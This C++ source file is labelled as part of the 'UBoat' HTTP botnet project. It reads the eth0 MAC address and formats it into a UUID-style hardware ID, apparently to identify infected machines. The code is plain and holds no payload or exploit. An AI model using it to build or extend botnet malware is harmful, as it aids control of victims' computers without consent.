/**
 * This file is part of UBoat - HTTP Botnet Project
 */

#include <cstring>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>

#include <ifaddrs.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>

#include "OSHwidChecker.h"

std::string print_uuid(uint64_t ab, uint64_t cd)
{
    std::stringstream ss;
    ss << std::hex << std::nouppercase << std::setfill('0');

    uint32_t a = (uint32_t)(ab >> 32);
    uint32_t b = (uint32_t)(ab & 0xFFFFFFFF);
    uint32_t c = (uint32_t)(cd >> 32);
    uint32_t d = (uint32_t)(cd & 0xFFFFFFFF);

    ss << std::setw(8) << (a) << '-';
    ss << std::setw(4) << (b >> 16) << '-';
    ss << std::setw(4) << (b & 0xFFFF) << '-';
    ss << std::setw(4) << (c >> 16) << '-';
    ss << std::setw(4) << (c & 0xFFFF);
    ss << std::setw(8) << d;

    return ss.str();
}

bool get_mac_address(std::vector<unsigned char>& _node)
{
    struct ifreq ifr;

    int s = socket(PF_INET, SOCK_DGRAM, 0);
    if (s == -1)
        return false; // cannot open socket

    std::strcpy(ifr.ifr_name, "eth0");
    int rc = ioctl(s, SIOCGIFHWADDR, &ifr);
    close(s);
    if (rc < 0)
        return false; // cannot get MAC address
    struct sockaddr* sa = reinterpret_cast<struct sockaddr*>(&ifr.ifr_addr);
    _node.resize(sizeof(sa->sa_data));
    std::memcpy(_node.data(), sa->sa_data, _node.size());

    return true;
}

bool getHwid(char* str, int bufferSize)
{
    std::vector<unsigned char> node;

    if (!get_mac_address(node)) {
        std::cout << "cannot determine MAC address (no suitable network adapter found)" << std::endl;
        return false;
    }

    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    node.resize(6);
    for (unsigned i = 0; i < 6; ++i)
        ss << std::setw(2) << int(node[i]);
    uint64_t t;

    if (! (ss >> t))
        return false;

    std::string macAddr = print_uuid(UBOAT_UUID_PREFIX, t);
    strncpy(str, macAddr.c_str(), bufferSize);

    return true;
}
